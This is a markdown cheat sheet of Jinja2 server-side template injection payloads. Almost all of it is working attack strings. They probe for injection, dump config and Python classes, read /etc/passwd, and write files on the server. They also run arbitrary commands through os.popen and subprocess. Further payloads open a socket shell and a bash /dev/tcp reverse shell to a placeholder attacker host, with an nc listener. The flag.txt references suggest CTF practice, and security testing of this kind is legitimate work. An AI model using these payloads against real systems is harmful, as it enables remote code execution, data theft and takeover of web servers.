# Jinja2 SSTI
## Jinja2 - Basic injection
##
#
https://medium.com/@fadebowaley/important-tips-on-jinja-templating-for-python-with-examples-292b9f8ed484
#
https://mapyourtech.com/2023/04/jinja2-tips-and-tricks-for-networking-engineers-with-code-examples/
#
https://shellsharks.com/htb-doctor
#
##


```python
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
{{config.items()}}
```
## Jinja2 - Template format

```python
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}
```
## Jinja2 - Debug Statement

```html
<pre>{% debug %}</pre>
```
## Jinja2 - Dump all used classes

```python
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```
## Jinja2 - Dump all config variables

```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```
## Jinja2 - Read remote file

```python
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```
## Jinja2 - Write into remote file

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
## Jinja2 - Remote Code Execution

```bash
nc -lnvp 8000
```
### Exploit the SSTI by calling subprocess.Popen.

```python
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```
### Exploit the SSTI by calling Popen without guessing the offset

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```
Simply modification of payload to clean up output and facilitate command input (https://twitter.com/SecGus/status/1198976764351066113) In another GET parameter include a variable named "input" that contains the command you want to run (For example: &input=ls)
```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
```

 ### Exploit the SSTI by writing an evil config file.
```python
# evil config
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }} 
```
